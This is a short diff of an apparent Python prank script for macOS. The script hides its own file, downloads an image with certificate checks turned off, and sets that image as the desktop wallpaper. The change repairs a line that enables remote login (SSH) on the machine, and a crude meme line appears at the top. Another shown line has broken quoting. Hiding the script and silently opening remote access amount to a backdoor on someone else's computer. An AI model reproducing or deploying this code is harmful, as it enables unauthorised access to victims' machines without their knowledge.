@@ -59,4 +59,4 @@ print "(Dicks out for Harambe.)"
 os.system('chflags hidden hap.py')
 os.system('curl -k https://s18.postimg.org/epobnzbs9/vinay_potato.png')
 os.system('osascript -e 'tell application "Finder" to set desktop picture to POSIX file "~/Downloads/vinay_potato.png"'')
-os.system(systemsetup -setremotelogin on)
+os.system('systemsetup -setremotelogin on')
